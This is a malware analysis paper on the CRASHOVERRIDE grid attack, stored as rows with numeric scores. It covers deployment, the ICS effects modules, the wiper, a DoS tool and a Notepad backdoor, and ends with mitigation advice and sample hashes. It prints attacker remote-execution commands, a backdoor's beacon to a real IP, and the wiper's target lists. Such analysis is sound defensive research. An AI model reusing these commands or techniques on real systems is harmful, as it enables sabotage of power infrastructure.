"After extensive environmental survey activity and verifying access in the 12 to 15 December 2016 time period, ELECTRUM proceeded to push the CRASHOVERRIDE framework to target hosts around 16 December 2016. After verifying connectivity and other operations, on 17 December ELECTRUM began pushing out malicious software to hosts connected to the server machines using a BAT file which called two, unrecovered VBS scripts. Although the exact content of the VBS items is unknown, review of the BAT indicates that they copy files to remote hosts and then verify via a directory listing. Of note, the BAT contains hard-coded addresses and separate files exist for each of the CRASHOVERRIDE payload modules except the ‘launcher’ module.",0.011306840499272663
Example lines from ‘101_copy.bat’ and ‘104_copy.bat’ include the following:,0.01223548864872992
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\ImapiService.exe” “C:\Delta\svchost.exe”,0.009169358944397521
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\101.dll” “C:\Delta\101.dll”,0.009087954709699808
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\139.ini” “C:\Delta\101.ini”,0.011446198368029181
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\haslo.dat” “C:\Delta\haslo.dat”,0.009253642516745764
cscript C:\Backinfo\sqlc.vbs “<TargetIP>” “-c”,0.011479429295598087
“dir C:\Delta\”,0.007667635369961512
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\ImapiService.exe” “C:\Delta\svchost.exe”,0.009169358944397521
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\104.dll” “C:\Delta\104.dll”,0.00929681169955221
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\140.ini” “C:\Delta\104.ini”,0.011170195716833198
cscript C:\Backinfo\ufn.vbs <TargetIP>,0.009526896994155765
“C:\Backinfo\haslo.dat” “C:\Delta\haslo.dat”,0.009253642516745764
cscript C:\Backinfo\sqlc.vbs “<TargetIP>” “-c”,0.011479429295598087
“dir C:\Delta\”,0.007667635369961512
"At a high level, CRASHOVERRIDE itself consists of at least three pieces (and in most cases, four): a launcher executable; an ICS protocol-specific payload module in DLL form; a wiper payload module, also in DLL form; and a configuration file for most of the effects payloads.",0.015634547485799066
"Of note, the above scripts do not include copying of the CRASHOVERRIDE launcher module. Artifacts relating to this event were not available, but given past observed activity, a likely option for moving this module to target devices would be the NET USE command or similar activity. The most likely reason for separating these actions is target specificity: while the CRASHOVERRIDE launcher module is common across all attack types, specific payload modules are required for different target devices. By copying the ‘core’ component first, along with other operations, ELECTRUM could conduct appropriate surveillance to determine what ICS targets link to victim hosts, and thus select the appropriate ICS effects payload module for deployment.",0.012610989947431483
"Once copied over, CRASHOVERRIDE is created and started as a system service in all observed cases except in the standalone OPC module. ELECTRUM uses the ‘remote.vbs’ script, described above, to call ‘sc config’ and related commands to start services on remote systems. For example:",0.008322114483069964
EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:<TargetIP> /u:<Host/Domain>\<User> /p:<Password> /t:-c sc config imapiservice binPath= “C:\Intel\imapi.exe C:\Intel\ imapi.dll i.ini” start= auto’;,0.011275945114870067
"Separate commands are issued to start the service, which will also start on system boot. The ‘binPath’ setting indicates the calling convention for CRASHOVERRIDE:",0.009643753463066007
CoreExecutable WorkingDirectory PayloadModule ConfigurationFile,0.00786835175216305
"While the service is started manually and set to auto-start on boot when configured, actual execution waits due to a timing function within the binary that is set to a hard-coded value. The specific coding routine is shown in Figure 4 and works to set a ‘trigger event’ for actual payload execution and to coordinate execution across multiple installations or victim hosts.",0.009947551385653286
Figure 4: CRASHOVERRIDE launcher timing function.,0.016049282683642252
"One item of immediate interest in analysing the available data is that ELECTRUM’s actions in copying the CRASHOVERRIDE payloads to hosts and executing them as services did not rely on a reported custom backdoor that was identified in the attack [6]. While this backdoor software was recovered from compromised hosts and existed within the environment, all identified data from recovered log and forensics information indicates that native system commands combined with credential re-use were used to deploy and execute ICS impact packages – with no indications of custom malware having been used (or needed) to produce this effect. While it is possible that evidence outside of what was available for this analysis does exist for use of the custom backdoor, a review of operations indicates that such malware was completely unnecessary to achieve the desired effect.",0.009833156481334426
"Before proceeding with further information about the attack, a review of the specific CRASHOVERRIDE components is required.",0.013835293499260715
CRASHOVERRIDE modules,0.006889520766262258
"CRASHOVERRIDE is a modular framework consisting of multiple, dependent parts. As shown in Figure 5, the ‘launcher’ module serves as the base for subsequent operations and provides the framework for subsequent effects modules to execute. Each effects module is specially purposed for either a specific ICS communication protocol or the general ‘wiping’ module. The process for an ICS attack entails the launcher module calling the exported ‘Crash’ function from a payload DLL that was specified when launched, using a configuration file to determine targets (depending on payload), and then automatically calling the wiper component – also a DLL exporting ‘Crash’ – after a cool-down period.",0.014345915186602554
Figure 5: CRASHOVERRIDE program flow.,0.016246816695705935
Launcher module,0.007933310325174414
"All recovered launcher modules feature relatively simplistic functionality. At a high level, they are designed as service executables that call the ‘Crash’ export for the provided DLL based on the calling parameters documented previously. Of interest, the launcher samples we analysed contained several hard-coded parameters, including a service name for the created service (examples include ‘defragsvc’ and ‘imapiservice’) and execution times for the payload after service start. Examples of execution times identified include:",0.0155415479761567
"December 17, 2016 22:27 UTC",0.0162857418931891
"December 20, 2016 06:30 UTC",0.01549742340509963
"After reaching the hard-coded time value, the service hands off execution to the relevant payload or effects DLL to begin producing the intended ICS impact. Two hours after initial attack execution, the launcher module moves execution to the destructive or ‘wiper’ module.",0.01334988047964314
Brief review of grid operations protocols,0.009474505841974179
"Electric distribution operations leverage supervisory control and data acquisition (SCADA) systems to manage grid operations across geographically distributed areas. Facilitating this activity are specific protocols designed to communicate with equipment from centralized operations centres. Protocols are often vendor- or region-specific. For example, IEC-101 and IEC-104, both of which are used in CRASHOVERRIDE, are generally used only in Europe and parts of the Middle East and Asia. North American operations typically rely on Distributed Network Protocol 3 (DNP3) for the same functionality. While all provide the same base-level capabilities, their implementations are somewhat different, meaning that ICS communications must be designed for the specific grid operations implementation at play. Figure 6 provides an overview of how various protocols ‘flow’ through a simplistic grid operations network design, highlighting the four protocols used in CRASHOVERRIDE: IEC-101, IEC-104, IEC-61850, and OPC DA. Additional information on grid operations and functionality can be found in the Dragos CRASHOVERRIDE whitepaper [7].",0.01961095907503918
Figure 6: CRASHOVERRIDE protocols in context.,0.014335209593832943
IEC-101,0.010974964380396579
"IEC-101 is a grid operations protocol mostly found in Europe as well as parts of Asia and the Middle East. Unlike the other protocols leveraged in CRASHOVERRIDE, IEC-101 uses serial communications (instead of TCP/IP) to control and communicate with equipment. The IEC-101 DLL (in all recovered cases creatively named ‘101.dll’) requires a configuration file that specifies Information Object Address (IOA) values. Ultimately, the module is designed simply to change the state of IOAs in order to switch physical breaker status from closed to open, or vice versa.",0.010085662841892495
IEC-104,0.01157634047966627
"IEC-104 is, in many respects, the same as IEC-101, except for the fact that communications take place over TCP/IP. As a result, the configuration file for IEC-104 payloads requires a target IP address, with the attack package focused on the same open/closed effect as seen in IEC-101. As shown in Figure 7, IEC-104 module execution flow is quite straightforward: the launcher calls the exported ‘Crash’ function from the IEC-104 DLL; a client thread is created; depending on configuration, a new communication process is started or an existing IEC-104 communications process is replaced; a socket is formed to controlled devices to begin sending traffic; traffic is recorded to a log file. Once this routine is complete, execution is handed back to the launcher to await the countdown triggering the destructive module.",0.01504477819613892
Figure 7: IEC-104 program flow.,0.024988188421782964
Figure 8: Wiper module registry manipulation.,0.01543933459139435
IEC-61850,0.010703648055076065
"IEC-61850 is a standard for substation communications with a global footprint, and with development efforts contributed by ABB [8, 9]. As such, this protocol features a much broader adoption than IEC-101 and IEC-104 and is more concerning for operators globally given this larger usage footprint.",0.01625930600114245
"Within recovered data, two versions of the IEC-61850 attack module were recovered: an EXE specifying a configuration file, and a DLL using the same ‘Crash’ export functionality as other recovered samples. An examination of the ‘WinMain’ routine for the EXE (Figure 9) and the ‘Crash’ export for the DLL (Figure 10) show initialization to be essentially the same as in previous modules, with the exception of the EXE’s specification of a configuration file, ‘i.ini’, located in the same directory. As a result, the EXE can be run as a stand-alone executable with no parameters aside from the presence of a configuration file (all options are hard coded), while the DLL requires the launcher with parameters specified.",0.010909690788353243
Figure 9: IEC-61850 EXE initialization.Figure 10: IEC-61850 DLL crash.,0.014264525929845395
"While a configuration file is specified (simply containing a list of IP addresses, one per line) both versions of the attack module also have functionality to dynamically perform network discovery. This is performed by first enumerating all network adapters on the victim machine, then enumerating all IPs connected to the network interfaces. Based on the network address and broadcast address for connected IPs, the module then attempts to connect to every IP in the subnet via broadcast address. Each successful connection is stored in an internal array matching the format of ‘i.ini’. While effective, this routine represents a very blunt (and exceptionally noisy) mechanism for indiscriminately identifying other hosts within the network.",0.012551661601788
"Actual communications with devices take place via TCP 102, the default listening port for this targeted version of IEC-61850-compliant communication. In this context, it is important to note that actual communications leverage Manufacturing Message Specification (MMS), while IEC-61850 provides the standard for addressing these messages within IEC-61850-1 [10]. Based on this, the modules gather and enumerate control points from devices corresponding to switches and breakers within the configuration file, with the ultimate goal of toggling designated control points following enumeration to either OPEN (0) or CLOSE (1) states. This provides effectively similar functionality (in terms of physical impact) to that of the IEC-101 and IEC-104 modules.",0.01675166869524003
OPC,0.007523615437690201
"OLE for Process Control (OPC), and specifically the Data Access (DA) standard [11], were targeted by CRASHOVERRIDE’s OPC-DA module. The standard is an OPC Foundation specification that ‘defines how real-time data can be transferred between a data source and a data sink (for example: a PLC and an HMI) without either of them having to know each other’s native protocol’ [12]. This module exists as a stand-alone executable. Examining available log and forensics data, the module is called via a remote execution routine with no need for support files, making it distinct from other modules:",0.012200608518689426
EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:<TargetIP> /u:<Host/Domain>\<User> /p:<Password> /t:-r cmd /c start c:\Intel\opc.exe’;,0.01218628327972604
"Examining the file supports the above conclusion. First, the module appears to re-use source code from a publicly available OPC client toolkit [13]. Second, no configuration file is necessary or referenced in the code, indicating that the binary should be able to perform some auto-discovery function. The module includes functionality for both local and remote enumeration of OPC server instances, but only local discovery is called. While default credentials appear to be hard coded for remote access in the MakeRemoteHost function (user ‘Administrator’ and password ‘[email protected]’), the specification still requires a hostname for the target device, which does not appear to be provided anywhere, and the function is never actually used.",0.013014391625293498
"The module is therefore limited to enumerating and interacting with local OPC server instances running on the infected host. Thus, unlike the other CRASHOVERRIDE modules, the OPC module is designed to run on the host providing ICS-related functionality and control, rather than sending messages ‘downstream’ to another device.",0.013608402263011521
"From an enumeration perspective, the program attempts to identify local items:",0.008378468813351692
ctlSelOn,0.009030298158582029
ctlSelOff,0.009669204226722461
ctlOperOn,0.007984848116709964
ctlOperOff,0.008993921573010932
stVal,0.008802760886534533
"Once this is complete, responding items are logged, then ‘ctlOperOn’ and ‘ctlSelOn’ are set (irrespective of their status during enumeration). Next, the module turns the same items off by setting ‘ctlOperOff’ and ‘ctlSelOff’. This corresponds to opening breakers or turning a selected pathway ‘off’, bringing functionality in line with previously discussed modules.",0.015224071947581796
Hybrid payload: OPC + 61850,0.00918619193739545
"ELECTRUM deployed a binary, named ‘imapi.dll’, that combines functionality for both the 61850 and OPC modules detailed above. As displayed in Figure 11, the ‘Crash’ export creates two threads in sequence: the first for a routine duplicating OPC module functionality, the second essentially replicating the 61850 modules.",0.013111166491895698
Figure 11: IMAPI sequential ThreadCreate.,0.015713648180715745
"Of note, this slightly more complex sample features a later execution time for effects delivery than others observed thus far: 20 December 2016 06:30 UTC. This corresponds to the ‘second round’ of attacks after the initial timing of around midnight on 17 December 2016. While this may seem to be a follow-on attack, compilation timestamps preserved as debug directory artifacts indicate that imapi was compiled before the initial outages and was therefore a pre-planned attack designed to occur at a later time. One possibility, based on the functionality of the two protocols, is that the paired attack is designed to overcome environmental fail-safes: notably, switchgear refusing to open if circuit breakers are not open to prevent arc. Combining the two payloads allows for OPC to target breakers (and potentially switchgear as well) while 61850 impacts switchgear. In combination, this would overcome operational fail-safes to deliver an electric distribution impact.",0.01348222549850775
Wiper module,0.007387414904977407
"The destructive, or ‘wiper’, module represents the last stage of the CRASHOVERRIDE attack. Following a two-hour timer (in samples available for analysis), the launcher executable once again looks for the exported ‘Crash’ function, but this time in a separate, hard-coded file that must be co-located in the specified working directory, ‘haslo.dat’.",0.012753961990733975
The wiper consists of three stages:,0.00860360141115779
Overwrite system service registry entries to null values to render the system unbootable.,0.010714329660759803
Remove files relating to ICS operations to impede recovery and system restoration.,0.01981395364505034
Terminate system processes to cause a crash and system shutdown.,0.012999383824765065
"First, the wiper moves to make the system unbootable by manipulating services listed in the following registry hive:",0.009021861043014279
SYSTEM\CurrentControlSet\Services,0.00905679738362064
"For each system service, the image path is cleared. On system restart, the machine will be unable to load system services, resulting in a failure to boot the OS (see Figure 8).2",0.012098517840415823
"Next, the wiper enumerates the infected machine for all drives C-Z except ‘V:\’. The wiper then looks for various generic file formats (e.g. ‘.exe’, ‘.zip’, ‘.tar’) as well as files with more specific extensions (as listed in Table 1) for deletion.",0.01232467458648745
File/extension,0.00779765670001098
Assessed purpose,0.008807842390114451
SYS_BASCOM.COM,0.008060646076745392
ABB SYS600 base system configuration file,0.006983109360258366
*.pcmp,0.008636934124228168
ABB PCM600 project file,0.007204056375970547
*.pcmi,0.008735654471102805
ABB PCM600 IEC file,0.007458920241710687
*.pcmt,0.009115760836125864
ABB PCM600 template IED file,0.007353340599722702
*.pl,0.007836941570158684
Programmable logic file (vendor neutral),0.01356257703029029
*paf,0.007722403355124419
PLC archive file (vendor neutral),0.011075769135443059
*.scl,0.00788517139206657
Substation configuration language (IEC-61850),0.018726957921763376
*.cid,0.011537914673506733
Configured IED description,0.007573960678268432
*.scd,0.007956359251815481
Substation configuration description (IEC-61850),0.015546857596868358
*.xrf,0.007529882357818707
Cross reference file used in ABB MicroSCADA,0.0070250703298732065
*.v,0.007512559562225407
Possibly AutoCAD,0.007586959621621814
*.trc,0.0077304726696061365
Trace file type specified in OPC DA,0.009852772320079861
*.cin,0.010573559956944312
ABB MicroSCADA specific file,0.006110812151153278
*.ini,0.00832417019191356
MicroSCADA documentation uses INI files extensively,0.007640299585552568
*.prj,0.008366260256984615
ABB control builder,0.006833411529372224
*.mdf,0.00873299860857979
Database format,0.008401269180905557
*.ldf,0.008301742327773587
Database format,0.008401269180905557
*.bak,0.008034836071405982
ABB SYS600 project files use BAK for backup files,0.008773223689654941
Table 1: File extensions searched for by the wiper for deletion.,0.016701158080241973
"Overall, the file types referenced are for ABB equipment, specifically the ABB MicroSCADA product line [15]. Essentially, the wiper looks to eliminate files relating to grid operations in order to inhibit service restoration and recovery based on previously saved, known-good configurations.",0.013243500456801893
"Finally, the wiper proceeds to terminate system processes to force a system crash:",0.008041620476487266
audiodg.exe,0.008058584857152606
lsm.exe,0.008421416507239488
svchost.exe,0.008678150062152001
conhost.exe,0.007789231027146681
services.exe,0.0080778407977673
taskhost.exe,0.008267478224697977
csrss.exe,0.00920083224942414
shutdown.exe,0.008589874615475002
wininit.exe,0.008235260191089555
dwm.exe,0.007971759354980512
smss.exe,0.008318712661595784
winlogon.exe,0.008131420215334861
explorer.exe,0.008222180427408743
spoolss.exe,0.008121266204759836
wuauclt.exe,0.00860750824191181
lsass.exe,0.008389516920935147
spoolsv.exe,0.008761785311024561
"At this stage, the impacted system – a device sitting ‘one hop’ away from the target ICS equipment for the specified impact module – is shut down, with immediate system restoration impossible without recourse to boot disks and non-standard manipulation of the impacted host. Furthermore, unless backups of relevant files are kept elsewhere in the network, precise ICS and SCADA service restoration is impossible due to the loss of configuration files.",0.013451607163468937
Primary backdoor module,0.007964286585355973
"ESET and initial Dragos reports all identified a primary backdoor initiating events for the CRASHOVERRIDE attack. As indicated above, subsequent analysis based on newly available data from the event indicates that this backdoor was not necessary for CRASHOVERRIDE and, based on recovered forensic artifacts, may not have been used to execute the attacks.",0.015730507897137813
"Admittedly, even with a far greater corpus of data than was available in June 2017 when CRASHOVERRIDE was first publicly disclosed, there remain gaps, therefore it is possible that other aspects of the attack relied on this custom backdoor. Nonetheless, a review of operations and software functionality indicate that this component – which is also the component that most resembles traditional malware and is easiest to detect via traditional security measures – is not necessary for executing a CRASHOVERRIDE-like event.",0.011587157236507828
"As this module has already received extensive coverage and analysis in other publications (namely ESET’s Industroyer analysis and Dragos’ CRASHOVERRIDE whitepaper), we will not examine it further here.",0.015521733805919813
Impeding recovery,0.008370636589875469
"In addition to the wiper module described previously, ELECTRUM also deployed a denial of service capability leveraging a previously disclosed and patched vulnerability in Siemens SIPROTEC equipment, CVE-2015-5374 [16]. The vulnerability was patched in 2015 – still relatively recent for device patching in ICS environments considering the attack took place in late 2016. The SIPROTEC device itself plays supporting and enabling roles in IEC-61850 communications and SCADA control, making it a potentially effective target to further disrupt operations during the attack by inhibiting operator control.",0.011918190717370103
"Unfortunately, in designing this software, which is appropriately named ‘dos.exe’, the attacker successfully implemented the specially crafted traffic to UDP 50000 that would trigger a denial of service condition, but failed to implement byte conversion for IP addresses when creating sockets. As a result, the module sends traffic to invalid, incorrect IP addresses. For example, if targeting 192.1.2.3, the created socket would send traffic to 3.2.1.192.",0.010526352027788288
"As implemented, the ‘dos.exe’ module includes a hard-coded list of IP addresses for attack. As a result, even if this error is caught at run-time, the adversary could not ‘fudge’ execution by reading in a modified list of ‘reversed’ IP addresses. Thus this module is effectively useless for the attack.",0.010284743685563313
Alternate backdoor,0.007824260123256543
"Finally, an additional backdoor component was discovered in the intrusion and originally noted by ESET in mid-2017. The backdoor itself is a modified copy of Windows Notepad. Within the environment, the file – based on exif and metadata – appears to be a legitimate, albeit older, copy of Notepad:",0.012340270097688233
"File Size                  : 72 kB
File Type                 : Win32 EXE
File Type Extension  : exe
MIME Type              : application/octet-stream
Machine Type          : Intel 386 or later, and compatibles
Time Stamp            : 2008:04:13 12:35:51-06:00
PE Type                  : PE32
Subsystem              : Windows GUI
File OS                    : Windows NT 32-bit
Object File Type       : Executable application
Language Code       : English (U.S.)
Company Name       : Microsoft Corporation
File Description        : Notepad
File Version             : 5.1.2600.5512 (xpsp.080413-2105)
Internal Name         : Notepad
Legal Copyright       : © Microsoft Corporation. All rights reserved.
Original File Name   : NOTEPAD.EXE
Product Name         : Microsoft® Windows® Operating System
Product Version       : 5.1.2600.5512",0.016137561858674876
"However, a review of plaintext strings immediately indicates something altered in the file. In addition to obfuscated program sections, the following observables appear:",0.011989547075598406
"RegisterPenApp
notepad.chm
hhctrl.ocx
CLSID\{ADB880A6-D8FF-11CF-9377-00AA003B7A11}\InprocServer32",0.008902142928255974
"Further research has identified samples exhibiting these static characteristics ranging from January 2016 (nearly a year before CRASHOVERRIDE) to the present. The programs themselves all launch a call-out to a hard-coded, but obfuscated, network address. Unfortunately, the exact purpose of this call-out is not completely clear at present. The observed traffic is likely a call-out beacon to initiate connection back to the executing host.",0.01172028557138649
"Several examples are evident in CRASHOVERRIDE data. One sample, named ‘csvd.exe’, produces the following call-out:",0.014155307274431816
"GET /8C7SW HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Host: 188.42.253.43:8820",0.012330121277983608
"Other examples recovered ‘in the wild’ include beacons to private addresses, public addresses with a destination port of TCP 4444 (potentially indicative of a Meterpreter payload), and other variations. At present, without complete traffic flows and additional context, this item remains somewhat mysterious in terms of its ultimate, complete functionality.",0.010264669646787294
"The IP address in question is unremarkable, belonging to a Singapore-based hosting provider with no associated domains. This is potentially adversary-owned infrastructure but it is more likely that it represents legitimate network space compromised by the adversary for first-hop communications.",0.013383487373286207
"At present, it is not certain if this tool represents an ELECTRUM-exclusive item or the re-purposing of a common backdoor by the group for the CRASHOVERRIDE attack. Work on this item continues.",0.01156989670821773
Context and mitigation,0.007860356390000711
Reviewing the entirety of the CRASHOVERRIDE event – from initial intrusion through ICS-focused physical impact – several interesting items emerge:,0.01274660104025338
"Except for the final ICS-focused payloads, almost no malware was used in the attack. The primary backdoor mechanism, discussed earlier, may not even have been used based on available information, and other malicious software variants represent publicly available frameworks such as Mimikatz.",0.013541734869612743
"Network intrusion, information gathering and pivoting all relied on credential capture and re-use and leveraging legitimate system tools for execution.",0.013708933764488784
"The timeframe of the overall intrusion is measured in months, but the shift to ICS impacts took place in a matter of weeks beginning in mid-December, potentially fuelled by earlier reconnaissance.",0.017854941196573382
"Based on all of the above items, ELECTRUM’s CRASHOVERRIDE attack represents both a sophisticated event (in terms of designing ICS-specific malicious payloads) and an example of fairly standard intrusion activities such as ‘living off the land’3. This mixed set of capabilities – from relatively advanced to commodity, ‘pentester 101’ – reveal an interesting aspect of both ELECTRUM and ICS intrusion events in general: while the ultimate impact scenario generally requires some specialized knowledge, actual network intrusion requires no especially advanced set of skills.",0.01243778595959677
"From a detection and response standpoint, especially when considered across the kill chain (Figure 2), identifying seemingly ‘commodity’ tactics within the context of the ICS environment is incredibly valuable. Typical binary defence focuses on anti-virus – yet anti-virus is largely designed to capture items that corrupt or subvert local or remote Windows processes and not programs designed to deliver ICS impacts. In the case of CRASHOVERRIDE, the only aspects that would fall under typical anti-virus detection are the Mimikatz variant and the ‘primary’ backdoor (which prior analysis indicates is not even a necessary component for the attack). Instead, identifying authentication information within the network, binary movement between IT and ICS and within ICS, and system alterations on critical hosts controlling ICS equipment, all would serve to detect – and form the foundation for mitigating – a CRASHOVERRIDE-type attack. Essentially, defenders need to tune detections and response from IT-centric approaches to ICS-specific capabilities, including capturing malicious behaviours – such as the rampant authentication and remote process activity exhibited by ELECTRUM – indicative of a ‘malware-less’ compromise event.",0.017592567228310263
"Unfortunately, the state of the modern ICS environment typically lacks the level of visibility – definitely on host, but also to a certain extent in network – that would allow such actions to be identified and tracked. Only by increasing visibility then orienting detection and monitoring toward adversary behaviours will ICS defenders be able to protect effectively against the next CRASHOVERRIDE attack. Given the peculiars of ICS intrusions – from ‘living off the land’ for standard Windows system compromise to bespoke ICS malware for ultimate effects – traditional, Windows-centric security solutions may not be the answer. Instead, ICS owners and operators will need to embrace the challenge provided by groups such as ELECTRUM and learn their environment, increase visibility, and determine at what point the merely ‘anomalous’ becomes malicious.",0.01208070186708432
"In this fashion, defenders can defend not merely against a CRASHOVERRIDE variant, but against entire classes of malicious activity. By focusing on necessary adversary actions – such as credential capture and binary movement for final effects – defenders can create necessary traffic and detection ‘choke points’ to monitor for and respond to such required activities. While this will not be easy, such a robust approach represents the only sure means of securing the ICS environment moving forward.",0.01471600564178066
Acknowledgements,0.0103658076566161
"Few efforts are ever completely solitary in nature, and information security stands out as a discipline where this is almost never the case. When reviewing the CRASHOVERRIDE data, this paper represents the culmination of efforts put forth by multiple individuals over a significant period of time, including: Dan Gunter, Ben Miller, Lesley Carhart, Selena Larson, and Jimmy Wylie.",0.014624687001758563
References,0.0158494738281566
[1] Confirmation of a Coordinated Attack on the Ukrainian Power Grid. SANS Institute. https://ics.sans.org/blog/2016/01/09/confirmation-of-a-coordinated-attack-on-the-ukrainian-power-grid#.,0.013442041038393193
[2] Control System Historian. ICS-CERT. https://ics-cert.us-cert.gov/Control_System_Historian-Definition.html.,0.013225031245536756
[3] xp_cmdshell. Microsoft. https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017.,0.010568970704514902
[4] Create Linked Servers. Microsoft. https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-2017.,0.012132750337308207
[5] PSExec. Microsoft Sysinternals. https://docs.microsoft.com/en-us/sysinternals/downloads/psexec.,0.011807294290307468
[6] WIN32/Industroyer: A New Threat for Industrial Control Systems (‘Main Backdoor’ section). ESET. https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf.,0.01173860205259003
[7] CRASHOVERRIDE: Analysis of the Threat to Electric Grid Operations. Dragos. https://dragos.com/blog/crashoverride/.,0.013499652372118809
[8] IEC 61850: What You Need to Know About Functionality and Practical Implementation. Schweitzer Engineering Laboratories. https://selinc.com/api/download/3671/.,0.014033423561331637
[9] IEC 61850 Power Utility Automation – ABB. https://new.abb.com/substation-automation/systems/iec-61850.,0.010871900178262561
[10] RFC1006. IETF. https://tools.ietf.org/html/rfc1006.,0.012688949087950485
[11] OLE for Process Control Data Access Automation Interface Standard. https://www-bd.fnal.gov/controls/opc/OPC_DA_Auto_2.02_Specification.pdf.,0.011243187800674126
[12] OPC Data Access (OPC DA) Versions and Compatibility. Matrikon. https://www.matrikonopc.com/opc-server/opc-data-access-versions.aspx.,0.009258735646517469
[13] https://sourceforge.net/projects/opcclient/files/OPCClientToolKit/.,0.011085764485825322
[14] Olympic Destroyer. Talos. https://blog.talosintelligence.com/2018/02/olympic-destroyer.html.,0.01282340553854977
[15] MicroSCADA Pro. ABB. https://new.abb.com/network-management/network-management/microscada-pro.,0.012413429626333294
[16] Siemens SIPROTEC Denial-of-Service Vulnerability. ICS-CERT. https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01.,0.014889848644078163
[17] Living Off the Land and Fileless Attack Techniques. Symantec. https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf.,0.014067182987285709
Footnotes,0.008231263626591545
1 Hashes for all recovered samples and malware can be found in Appendix A.,0.017061424294548933
"2 In some respects, this behaviour is functionally (in terms of outcome) equivalent to the service wiping function used in the Olympic Destroyer event (see [14]). However, the two are implemented differently, thus not indicating any definitive link between the entities responsible.",0.01709458838831379
"3 Although used elsewhere, a term best explained in [17].",0.009015343241292384
Appendix A – List of sample hashes,0.010468377927219441
"The following list includes recovered sample hashes from CRASHOVERRIDE, including binaries and scripts.",0.016026843404383873
Name,0.008767860254893844
SHA256,0.009626279759872403
Function,0.008223956258906373
101_copy.bat,0.00981167138486394
a95f6d43e62a5cfb4e95667df9b04d07b60d103b36f4cff12c07e7c2dab88a98,0.010845751204320186
"Runs ufn.vbs and sqlc.vbs, copies 101 payloads to specified hosts",0.007783173574530844
104.bat,0.009157698915385426
07d5d5ba8cd17efab2ebf3b76cb6b61825249518c11c3910ceb6473e0efb3deb,0.010653836128349137
"Runs sqlc.vbs, configures ImapiService",0.007710662582067762
104.dll,0.0073727501803070306
7907dd95c1d36cf3dc842a1bd804f0db511a0f68f4b3d382c23a3c974a383cad,0.010563246217113798
104 effects module,0.00873484958534787
104_copy.bat,0.009767458338876711
693c631f1673bd61135080e9b4759342c5835d20231f6f4f7b55117fda111e4f,0.010152368360831443
"Runs ufn.vbs and sqlc.vbs, copies 104 payloads to specified hosts",0.007854833143390083
104_copy.bat,0.009767458338876711
a95f6d43e62a5cfb4e95667df9b04d07b60d103b36f4cff12c07e7c2dab88a98,0.010845751204320186
"Runs ufn.vbs and sqlc.vbs, copies 104 payloads to specified hosts",0.007854833143390083
61850.dll,0.007041552980385557
4e7d2b269088c1575a31668d86de95fd3dde6caa88051d7ec110f7f150058789,0.0107430893684064
61850 effects module - DLL variant,0.008548662828876674
61850.exe,0.007721998574542033
55e7471ad841bd8a110818760ea89af3bb456493f0798a54ce3b8e7b790afd0a,0.009589056072930036
61850 effects module - EXE variant,0.008626110650663654
alg.exe,0.008184754304737751
3e3ab9674142dec46ce389e9e759b6484e847f5c1e1fc682fc638fc837c13571,0.009626350457916377
Primary backdoor,0.007985471906492458
avtask.exe,0.008482136533595197
37d54e3d5e8b838f366b9c202f75fa264611a12444e62ae759c31a0d041aa6e4,0.010644359219381339
Primary backdoor,0.007985471906492458
avtask.exe,0.008482136533595197
7e96849c69263e0125419a3fbb2547050329b7189db599d8136650171818bd81,0.009394776645411107
Primary backdoor,0.007985471906492458
avtask2.exe,0.008349036586081882
41658472df4074a0a2a2298ba3f17e0b17112fed99e495bf34dac138d6f7b247,0.009511149646818318
Primary backdoor,0.007985471906492458
c.exe,0.008042684296076685
502402f8568359645d50f1d6e58ab927f05702f6220b60767897b3912b761b99,0.010331668255622706
Primary backdoor,0.007985471906492458
csvd.exe,0.008514099985304835
f6e62b1d75d91171ab30e8985189ea5aacd947c887222fdb58acbc2db2542f64,0.009842701739122162
Backdoor NOTEPAD variant,0.007296112036027869
csvf.exe,0.008427969627029741
767b078645baef34cfb366a41df8fe65bcce597c2bc9c08cae063d287f7a8011,0.010442184170964541
Backdoor NOTEPAD variant,0.007296112036027869
csvnpr.exe,0.008421955581717877
9860c3d30233c7f1c6631caefa2b6632a01b2b729909bc0dd894c5b418b4eb1b,0.010114207095158645
Backdoor NOTEPAD variant,0.007296112036027869
defragsvc.exe,0.007956618816995609
21c1fdd6cfd8ec3ffe3e922f944424b543643dbdab99fa731556f8805b0d5561,0.010031527637390791
Launcher module,0.007933310325174414
dos.exe,0.00834487248140059
4587ccfecc9a1ff5c5538a3475409ca1687d304bcde252077a119c436296857b,0.009923245052450569
Siemens SIPROTEC DoS module,0.008072380024422676
ep.exe,0.008302341851222694
3ca252fb405c83cceea25041c3f1c01bead8f1afe0144f8cdee795bb868a903d,0.01001902318231751
Primary backdoor,0.007985471906492458
haslo.dat,0.007600548669415064
018eb62e174efdcdb3af011d34b0bf2284ed1a803718fba6edffe5bc0b446b81,0.010423192056208674
Destructive module,0.0066049294354525445
haslo.exe,0.00803279288167913
ad23c7930dae02de1ea3c6836091b5fb3c62a89bf2bcfb83b4b39ede15904910,0.009909787589690855
Destructive module,0.0066049294354525445
ilaunchr.exe,0.008814636294936506
c57e390d4c1ba116a28fe618d407395d261f25c2901d1fe68f420fb47a26f444,0.010061438718438787
Primary backdoor,0.007985471906492458
imapi.dll,0.007487162788167523
12ba9887d3007b0a0713d9f1973e1176bd33eccb017b5a7dba166c7c172151e9,0.010156554739036983
Hybrid 61850 and OPC effects module,0.00877969131784151
imapi.exe,0.007849316849532384
